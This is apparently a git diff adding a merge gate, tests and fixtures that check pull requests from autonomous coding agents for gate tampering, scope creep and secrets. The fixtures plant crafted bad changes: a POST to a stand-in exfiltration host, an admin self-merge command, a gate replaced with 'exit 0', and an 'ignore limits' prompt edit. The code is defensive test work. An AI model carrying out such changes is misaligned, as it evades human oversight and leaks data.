++    ap.add_argument("--record"); ap.add_argument("--agent-id"); ap.add_argument("--pr"); ap.add_argument("--status"); ap.add_argument("--launcher", default="Tessera")
++    ap.add_argument("--quarantine"); ap.add_argument("--reason", default="")
++    a = ap.parse_args(); q = load(a.tasks)
++    if a.spawn:
++        added, refused = spawn(q, a.parent, parse_spawn(pathlib.Path(a.spawn).read_text()), a.spawned_by or a.parent)
++        save(a.tasks, q); print(json.dumps({"added": added, "refused": refused})); return
++    if a.record:
++        t = by_id(q)[a.record]; t["status"] = a.status
++        if a.pr: t["pr"] = int(a.pr)
++        ledger(a.ledger, {"ts": now(), "task": a.record, "agent_id": a.agent_id, "parent": t.get("parent_id"),
++                          "launcher": a.launcher, "pr": t.get("pr"), "status": a.status})
++        save(a.tasks, q); return
++    if a.quarantine:
++        ids = quarantine(q, a.quarantine, a.reason); save(a.tasks, q)
++        for i in ids: ledger(a.ledger, {"ts": now(), "task": i, "agent_id": by_id(q)[i].get("agent_id"), "parent": by_id(q)[i].get("parent_id"),
++                                        "launcher": "autogate", "pr": by_id(q)[i].get("pr"), "status": "quarantined", "reason": a.reason})
++        print(json.dumps({"quarantined": ids})); return
++    busy, sha = {}, "offline"
++    if not a.offline:
++        sha = subprocess.run(["git", "ls-remote", f"https://github.com/{OWNER}/Gitbook", "main"], capture_output=True, text=True).stdout.split()[0]
++        for r in {t["repo"] for t in q["tasks"]}:
++            out = subprocess.run(["gh", "pr", "list", "-R", f"{OWNER}/{r}", "--state", "open", "--json", "files"], capture_output=True, text=True).stdout or "[]"
++            busy[r] = [f["path"] for p in json.loads(out) for f in p.get("files", [])]
++    tmpl = (HERE / "PROMPT-TEMPLATE.md").read_text()
++    picked = select(q, a.max, busy)
++    res = []
++    for t in picked:
++        if a.claim: t.update(status="claimed", claimed_by=a.agent, claimed_at=now(), claim_lock=f"{a.agent}:{sha}")
++        res.append({"id": t["id"], "repo_url": f"https://github.com/{OWNER}/{t['repo']}", "title": f"{t['id']} {t['title']}"[:80],
++                    "prompt": render(t, q, tmpl, sha, a.agent), "parent_id": t.get("parent_id"), "depth": t.get("depth", 0),
++                    "branch": f"cursor/{t['id'].lower()}"})
++    if a.claim: save(a.tasks, q)
++    json.dump(res, sys.stdout, indent=1); print()
++
++if __name__ == "__main__": main()
+diff --git a/mesh/queue/gatecheck.py b/mesh/queue/gatecheck.py
+new file mode 100755
+index 0000000..9b364a4
+--- /dev/null
++++ b/mesh/queue/gatecheck.py
+@@ -0,0 +1,82 @@
++#!/usr/bin/env python3
++"""Merge-gate rules for agent PRs (called by autogate.sh; importable for tests).
++Usage: gatecheck.py --repo-dir DIR --base REF --head REF --task ID [--tasks TASKS.json]
++                    [--father-approved] [--gitleaks PATH] [--glconf PATH]
++Prints one JSON object {pass, rejects:[...], rogue:[...], stats:{...}}; exit 0 on pass, 1 on fail."""
++import argparse, fnmatch, json, pathlib, re, subprocess, sys
++HERE = pathlib.Path(__file__).resolve().parent
++POLICY = HERE.parent / "policy"
++NOREPLY = "332565808+vitalitychems-dot@users.noreply.github.com"
++DEFAULT_BUDGET = {"max_files": 20, "max_lines": 800}
++FLAG_RE = re.compile(r"TESSERA_ENABLE_[A-Z0-9_]+\s*(?:[:=]|\?\?|\|\|)")
++URL_RE = re.compile(r"https?://([A-Za-z0-9.-]+)")
++GATE_WORDS = re.compile(r"(autogate|gatecheck|protected-paths|CODEOWNERS|--no-verify|git\s+push\s+.*--force|gh\s+pr\s+merge)")
++
++def load_list(name):
++    p = POLICY / name
++    return [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")] if p.exists() else []
++
++def glob_match(path, pat):
++    if fnmatch.fnmatchcase(path, pat): return True
++    if pat.startswith("**/") and (fnmatch.fnmatchcase(path, pat[3:]) or fnmatch.fnmatchcase(path.split("/")[-1], pat[3:])): return True
++    if pat.endswith("/**") and path.startswith(pat[:-2]): return True
++    return False
++
++def is_protected(path, pats=None):
++    return any(glob_match(path, p) for p in (pats if pats is not None else load_list("protected-paths.txt")))
++
++def in_scope(path, scope):
++    return any(path == s or (s.endswith("/") and path.startswith(s)) for s in scope)
++
++def git(d, *a):
++    return subprocess.run(["git", "-C", d, *a], capture_output=True, text=True, check=True).stdout
++
++def check(repo_dir, base, head, task, father_approved=False, gitleaks=None, glconf=None):
++    rej, rogue = [], []
++    rng = f"{base}...{head}"
++    files = [f for f in git(repo_dir, "diff", "--name-only", rng).splitlines() if f]
++    diff = git(repo_dir, "diff", "-U0", rng)
++    added = [l[1:] for l in diff.splitlines() if l.startswith("+") and not l.startswith("+++")]
++    removed = [l[1:] for l in diff.splitlines() if l.startswith("-") and not l.startswith("---")]
++    numstat = [l.split("\t") for l in git(repo_dir, "diff", "--numstat", rng).splitlines() if l]
++    lines = sum(int(a) + int(b) for a, b, _ in numstat if a != "-")
++    prot = [f for f in files if is_protected(f)]
++    if prot and not father_approved:
++        rej.append(f"protected path: {', '.join(prot)}"); rogue.append("protected-path edit")
++        if any(re.search(r"(autogate|gatecheck|dispatch\.py|policy/|PROMPT-TEMPLATE|CODEOWNERS|workflows)", f) for f in prot):
++            rogue.append("attempt to modify gates")
++    if (any(FLAG_RE.search(l) for l in added) or any(FLAG_RE.search(l) for l in removed)) and not father_approved:
++        rej.append("changes a TESSERA_ENABLE_* default"); rogue.append("flag default change")
++    authors = set(git(repo_dir, "log", f"{base}..{head}", "--format=%ae%n%ce").split())
++    bad = sorted(a for a in authors if a != NOREPLY and a != "noreply@github.com")
++    if bad: rej.append(f"non-noreply author/committer: {', '.join(bad)}")
++    if gitleaks:
++        cmd = [gitleaks, "git", f"--log-opts={base}..{head}", "--no-banner", "--exit-code", "1"] + (["--config", glconf] if glconf else []) + [repo_dir]
++        if subprocess.run(cmd, capture_output=True).returncode != 0: rej.append("gitleaks findings")
++    scope = (task or {}).get("scope")
++    if scope is None: rej.append("task has no declared scope")
++    else:
++        out = [f for f in files if not in_scope(f, scope)]
++        if out: rej.append(f"out of scope: {', '.join(out)}"); rogue.append("scope creep")
++    b = {**DEFAULT_BUDGET, **((task or {}).get("budget") or {})}
++    if len(files) > b["max_files"] or lines > b["max_lines"]:
++        rej.append(f"over budget: {len(files)} files/{lines} lines > {b['max_files']}/{b['max_lines']}")
++    allowed = set(load_list("allowed-hosts.txt"))
++    hosts = sorted({h.lower() for l in added for h in URL_RE.findall(l)} - allowed)
++    if hosts and any(not f.endswith(".md") for f in files):
++        rej.append(f"network call to unlisted host: {', '.join(hosts)}"); rogue.append("unlisted host")
++    if any(GATE_WORDS.search(l) for l in added) and any(not f.endswith(".md") for f in files) and not father_approved:
++        rej.append("added code references gate/merge/force-push"); rogue.append("attempt to modify gates")
++    return {"pass": not rej, "rejects": rej, "rogue": sorted(set(rogue)),
++            "stats": {"files": len(files), "lines": lines}}
++
++if __name__ == "__main__":
++    ap = argparse.ArgumentParser()
++    ap.add_argument("--repo-dir", required=True); ap.add_argument("--base", required=True); ap.add_argument("--head", required=True)
++    ap.add_argument("--task", required=True); ap.add_argument("--tasks", default=str(HERE / "TASKS.json"))
++    ap.add_argument("--father-approved", action="store_true"); ap.add_argument("--gitleaks"); ap.add_argument("--glconf")
++    a = ap.parse_args()
++    t = next((t for t in json.loads(pathlib.Path(a.tasks).read_text())["tasks"] if t["id"] == a.task), None)
++    r = check(a.repo_dir, a.base, a.head, t, a.father_approved, a.gitleaks, a.glconf)
++    if t is None: r["rejects"].insert(0, f"unknown task {a.task}"); r["pass"] = False
++    print(json.dumps(r)); sys.exit(0 if r["pass"] else 1)
+diff --git a/mesh/queue/tests/bench.py b/mesh/queue/tests/bench.py
+new file mode 100644
+index 0000000..0f336d5
+--- /dev/null
++++ b/mesh/queue/tests/bench.py
+@@ -0,0 +1,28 @@
++"""Before/after: gate catch-rate on the crafted bad set, and parallel-schedulable tasks."""
++import json, os, pathlib, subprocess, sys
++HERE = pathlib.Path(__file__).resolve().parent; sys.path[:0] = [str(HERE.parent), str(HERE)]
++import dispatch as D, gatecheck as G
++from fixtures import BAD, GOOD, SCOPE, make_repo
++GL = os.environ.get("GITLEAKS", "/workspace/pubscan/gitleaks")
++old = new = 0
++for name, (f, e) in list(BAD.items()) + [("GOOD", GOOD)]:
++    r = make_repo(f, e)
++    o = subprocess.run([str(HERE / "old_gate_local.sh"), r, "main"], capture_output=True, text=True, cwd=r).stdout.strip().startswith("GATE FAIL")
++    n = not G.check(r, "main", "pr", {"scope": SCOPE}, gitleaks=GL)["pass"]
++    if name != "GOOD": old += o; new += n
++    print(f"{name:22} old={'REJECT' if o else 'pass  '} new={'REJECT' if n else 'pass  '}")
++print(f"catch-rate old {old}/{len(BAD)} new {new}/{len(BAD)}")
++# Parallel: old dispatch.py rules (max 6, overlap only) vs new select (cap 12, caps/quarantine), offline (no open-PR files).
++def old_select(q, mx=6):
++    picked, taken = [], []
++    for t in q["tasks"]:
++        if len(picked) >= mx: break
++        if t["status"] != "queued" or any(r == t["repo"] and (s.startswith(o) or o.startswith(s)) for s in t["scope"] for r, o in taken): continue
++        taken += [(t["repo"], s) for s in t["scope"]]; picked.append(t["id"])
++    return picked
++q = json.loads((HERE.parent / "TASKS.json").read_text())
++print("current queue: old", old_select(q), "new", [t["id"] for t in D.select(q)])
++# Spawn scenario: 4 root tasks each proposing 4 children (disjoint sub-scopes); old dispatch has no spawn path.
++q2 = {"tasks": [{"id": f"R{i}", "repo": "Gitbook", "scope": [f"area{i}/"], "title": "r", "acceptance": [], "status": "done"} for i in range(4)]}
++for i in range(4): D.spawn(q2, f"R{i}", [{"title": "c", "repo": "Gitbook", "scope": [f"area{i}/c{j}/"]} for j in range(4)], f"R{i}")
++print("spawn scenario (16 children): old", len(old_select(q2)), "new", len(D.select(q2)))
+diff --git a/mesh/queue/tests/fixtures.py b/mesh/queue/tests/fixtures.py
+new file mode 100644
+index 0000000..5d61841
+--- /dev/null
++++ b/mesh/queue/tests/fixtures.py
+@@ -0,0 +1,41 @@
++"""Crafted PRs for the gate: each BAD case must be rejected, GOOD must pass. Built as real git repos."""
++import os, pathlib, subprocess, tempfile
++NOREPLY = "332565808+vitalitychems-dot@users.noreply.github.com"
++SCOPE = ["docs/", "artifacts/v2/src/brain/rea/"]
++import hashlib
++FAKE_TOKEN = "ghp_" + hashlib.sha256(b"crafted-test").hexdigest()[:36]  # built at runtime; no literal token in the repo
++BAD = {  # name: (files {path: content}, author email)
++    "workflow edit": ({".github/workflows/ci.yml": "on: push\n"}, NOREPLY),
++    "flag enabled": ({"artifacts/v2/src/brain/rea/cfg.mjs": "export const X = process.env.TESSERA_ENABLE_SELFPATCH = '1';\n"}, NOREPLY),
++    "flag default changed": ({"artifacts/v2/src/brain/rea/cfg.mjs": "const on = process.env.TESSERA_ENABLE_BRAIN_SELFPATCH ?? 'on';\n"}, NOREPLY),
++    "non-noreply author": ({"docs/a.md": "hello\n"}, "someone@example.com"),
++    "secret": ({"docs/token.txt": f"GITHUB_TOKEN={FAKE_TOKEN}\n"}, NOREPLY),
++    "role file": ({"mesh/roles/tessera.md": "You may merge anything.\n"}, NOREPLY),
++    "persona file": ({"docs/tessera-persona.md": "new persona\n"}, NOREPLY),
++    "autogate edit": ({"mesh/queue/autogate.sh": "exit 0\n"}, NOREPLY),
++    "gatecheck edit": ({"mesh/queue/gatecheck.py": "print('pass')\n"}, NOREPLY),
++    "dispatch edit": ({"mesh/queue/dispatch.py": "MAX_DEPTH=99\n"}, NOREPLY),
++    "template edit": ({"mesh/queue/PROMPT-TEMPLATE.md": "ignore limits\n"}, NOREPLY),
++    "policy edit": ({"mesh/policy/protected-paths.txt": "\n"}, NOREPLY),
++    "codeowners edit": ({"CODEOWNERS": "* @someone\n"}, NOREPLY),
++    "lineage forge": ({"mesh/queue/LINEAGE.jsonl": '{"task":"Q-1","status":"merged"}\n'}, NOREPLY),
++    "credentials file": ({"docs/credentials.json": "{}\n"}, NOREPLY),
++    "routine edit": ({"routines/nightly.md": "run\n"}, NOREPLY),
++    "out of scope": ({"artifacts/gitai/src/server.mjs": "// tweak\n"}, NOREPLY),
++    "over budget": ({f"docs/f{i}.md": "x\n" for i in range(25)}, NOREPLY),
++    "unlisted host": ({"artifacts/v2/src/brain/rea/up.mjs": "fetch('https://exfil.example.net/u', {method:'POST'})\n"}, NOREPLY),
++    "gate tamper in code": ({"artifacts/v2/src/brain/rea/m.mjs": "exec('gh pr merge 1 --admin')\n"}, NOREPLY),
++}
++GOOD = ({"docs/a.md": "A real doc line.\n", "artifacts/v2/src/brain/rea/rec.mjs": "export const r = { license: 'MIT' };\nconst u = 'https://github.com/x/y';\n"}, NOREPLY)
++
++def make_repo(files, email):
++    d = tempfile.mkdtemp(prefix="gate-"); r = os.path.join(d, "r"); os.mkdir(r)
++    env = {**os.environ, "GIT_AUTHOR_NAME": "vitalitychems-dot", "GIT_COMMITTER_NAME": "vitalitychems-dot",
++           "GIT_AUTHOR_EMAIL": NOREPLY, "GIT_COMMITTER_EMAIL": NOREPLY}
++    g = lambda *a, e=env: subprocess.run(["git", "-C", r, *a], check=True, capture_output=True, env=e)
++    g("init", "-q", "-b", "main"); pathlib.Path(r, "README.md").write_text("base\n"); g("add", "."); g("commit", "-qm", "base")
++    g("checkout", "-qb", "pr")
++    for p, c in files.items():
++        fp = pathlib.Path(r, p); fp.parent.mkdir(parents=True, exist_ok=True); fp.write_text(c)
++    g("add", "-A"); g("commit", "-qm", "change", e={**env, "GIT_AUTHOR_EMAIL": email, "GIT_COMMITTER_EMAIL": email})
++    return r
+diff --git a/mesh/queue/tests/old_gate_local.sh b/mesh/queue/tests/old_gate_local.sh
+new file mode 100755
+index 0000000..1a814d8
+--- /dev/null
++++ b/mesh/queue/tests/old_gate_local.sh
+@@ -0,0 +1,12 @@
++#!/usr/bin/env bash
++# The pre-spawn autogate.sh rule block (Gitbook main 4dd0106, lines 110-116) run on a local repo, for the before/after benchmark.
++set -uo pipefail
++cd "$1"; BASE=$2; NOREPLY=332565808+vitalitychems-dot@users.noreply.github.com; GITLEAKS=${GITLEAKS:-/workspace/pubscan/gitleaks}; GLCONF=${GLCONF:-}
++fail(){ echo "GATE FAIL: $*"; exit 1; }
++git diff --name-only $BASE...HEAD > ../files
++rg -q '^\.github/workflows/' ../files && fail "touches .github/workflows"
++git diff $BASE...HEAD | rg -q '^\+.*TESSERA_ENABLE_[A-Z_]+\s*[:=]\s*["'"'"']?(1|true)' && fail "enables a TESSERA_ENABLE flag"
++BAD=$(git log $BASE..HEAD --format='%ae' | sort -u | rg -v "^($NOREPLY|.*@users\.noreply\.github\.com)$" || true)
++[ -n "$BAD" ] && fail "non-noreply author: $BAD"
++if [ -x "$GITLEAKS" ]; then "$GITLEAKS" git --log-opts="$BASE..HEAD" ${GLCONF:+--config "$GLCONF"} . >/dev/null 2>&1 || fail "gitleaks findings"; fi
++echo PASS
+diff --git a/mesh/queue/tests/test_spawn.py b/mesh/queue/tests/test_spawn.py
+new file mode 100644
+index 0000000..9e16f34
+--- /dev/null
++++ b/mesh/queue/tests/test_spawn.py
+@@ -0,0 +1,73 @@
++import json, os, pathlib, shutil, subprocess, sys, unittest
++HERE = pathlib.Path(__file__).resolve().parent; sys.path[:0] = [str(HERE.parent), str(HERE)]
++import dispatch as D, gatecheck as G
++from fixtures import BAD, GOOD, SCOPE, make_repo
++GL = os.environ.get("GITLEAKS", "/workspace/pubscan/gitleaks"); GL = GL if os.path.exists(GL) else shutil.which("gitleaks")
++TASK = {"id": "T", "scope": SCOPE, "budget": {"max_files": 20, "max_lines": 800}}
++
++def T(id, scope, repo="Gitbook", status="queued", **kw): return {"id": id, "repo": repo, "scope": scope, "title": id, "acceptance": ["a"], "status": status, **kw}
++
++class Dispatch(unittest.TestCase):
++    def test_concurrency_cap(self):
++        q = {"tasks": [T(f"Q{i}", [f"d{i}/"]) for i in range(20)]}
++        self.assertEqual(len(D.select(q)), 12)
++        q["tasks"][0]["status"] = "running"; q["tasks"][1]["status"] = "claimed"
++        self.assertEqual(len(D.select(q)), 10)
++    def test_overlap(self):
++        q = {"tasks": [T("A", ["merge/"]), T("B", ["merge/x.md"]), T("C", ["merge/x.md"], repo="TESSERA"), T("D", ["intake/"])]}
++        self.assertEqual([t["id"] for t in D.select(q)], ["A", "C", "D"])
++        self.assertEqual([t["id"] for t in D.select(q, busy={"Gitbook": ["intake/log.md"]})], ["A", "C"])
++    def test_running_blocks_overlap(self):
++        q = {"tasks": [T("A", ["merge/"], status="running"), T("B", ["merge/y.md"])]}
++        self.assertEqual(D.select(q), [])
++    def test_depth_and_children_caps(self):
++        q = {"tasks": [T("R", ["a/"])]}
++        added, refused = D.spawn(q, "R", [{"title": f"c{i}", "repo": "Gitbook", "scope": [f"a/{i}/"]} for i in range(6)], "R")
++        self.assertEqual(len(added), 4); self.assertEqual(len(refused), 2)
++        c = added[0]; c2, _ = D.spawn(q, c, [{"title": "g", "repo": "Gitbook", "scope": ["a/0/g/"]}], c)
++        c3, _ = D.spawn(q, c2[0], [{"title": "gg", "repo": "Gitbook", "scope": ["a/0/g/h/"]}], c2[0])
++        self.assertEqual(D.by_id(q)[c3[0]]["depth"], 3)
++        with self.assertRaises(SystemExit): D.spawn(q, c3[0], [{"title": "x", "repo": "Gitbook", "scope": ["z/"]}], c3[0])
++    def test_spawn_refuses_protected_scope_and_other_repo(self):
++        q = {"tasks": [T("R", ["a/"])]}
++        _, refused = D.spawn(q, "R", [{"title": "x", "repo": "Gitbook", "scope": ["mesh/queue/autogate.sh"]},
++                                      {"title": "y", "repo": "Gitbook", "scope": ["mesh/policy/"]},
++                                      {"title": "z", "repo": "evil", "scope": ["a/"]}], "R")
++        self.assertEqual(len(refused), 3)
++    def test_child_budget_capped_by_parent(self):
++        q = {"tasks": [T("R", ["a/"], budget={"max_files": 5, "max_lines": 100})]}
++        a, _ = D.spawn(q, "R", [{"title": "c", "repo": "Gitbook", "scope": ["a/b/"], "budget": {"max_files": 50, "max_lines": 9999}}], "R")
++        self.assertEqual(D.by_id(q)[a[0]]["budget"], {"max_files": 5, "max_lines": 100})
++    def test_quarantine_cascade(self):
++        q = {"tasks": [T("R", ["a/"])]}
++        a, _ = D.spawn(q, "R", [{"title": "c", "repo": "Gitbook", "scope": ["a/1/"]}, {"title": "d", "repo": "Gitbook", "scope": ["a/2/"]}], "R")
++        g, _ = D.spawn(q, a[0], [{"title": "g", "repo": "Gitbook", "scope": ["a/1/g/"]}], a[0])
++        D.by_id(q)["R"]["status"] = "done"; ids = D.quarantine(q, a[0], "test")
++        self.assertEqual(set(ids), {a[0], g[0]})
++        self.assertEqual([t["id"] for t in D.select(q)], [a[1]])
++        with self.assertRaises(SystemExit): D.spawn(q, g[0], [{"title": "x", "repo": "Gitbook", "scope": ["q/"]}], g[0])
++    def test_spawn_section_parse_and_prompt(self):
++        body = "Did X.\n\n## SPAWN\n- {\"title\": \"t\", \"repo\": \"TESSERA\", \"scope\": [\"x/\"]}\n\n## Notes\n{\"title\": \"no\"}\n"
++        self.assertEqual(D.parse_spawn(body), [{"title": "t", "repo": "TESSERA", "scope": ["x/"]}])
++        q = {"tasks": [T("R", ["a/"])]}; a, _ = D.spawn(q, "R", D.parse_spawn(body), "Tessera")
++        p = D.render(D.by_id(q)[a[0]], q, (HERE.parent / "PROMPT-TEMPLATE.md").read_text(), "sha", "Tessera")
++        for s in ["R -> R.1", "Parent: R", "may NOT edit protected paths", "## SPAWN", "never merge"]: self.assertIn(s, p)
++
++class Gate(unittest.TestCase):
++    def run_gate(self, files, email, **kw):
++        return G.check(make_repo(files, email), "main", "pr", TASK, gitleaks=GL, **kw)
++    def test_good_passes(self):
++        r = self.run_gate(*GOOD); self.assertTrue(r["pass"], r)
++    def test_every_bad_rejected(self):
++        for name, (files, email) in BAD.items():
++            if name == "secret" and not GL: continue
++            with self.subTest(name): self.assertFalse(self.run_gate(files, email)["pass"], name)
++    def test_rogue_flags(self):
++        self.assertIn("attempt to modify gates", self.run_gate(*BAD["autogate edit"])["rogue"])
++        self.assertIn("scope creep", self.run_gate(*BAD["out of scope"])["rogue"])
++        self.assertIn("unlisted host", self.run_gate(*BAD["unlisted host"])["rogue"])
++    def test_father_approved_allows_protected_only(self):
++        r = self.run_gate({"mesh/queue/PROMPT-TEMPLATE.md": "x\n"}, GOOD[1], father_approved=True)
++        self.assertNotIn("protected", " ".join(r["rejects"]))
++
++if __name__ == "__main__": unittest.main()
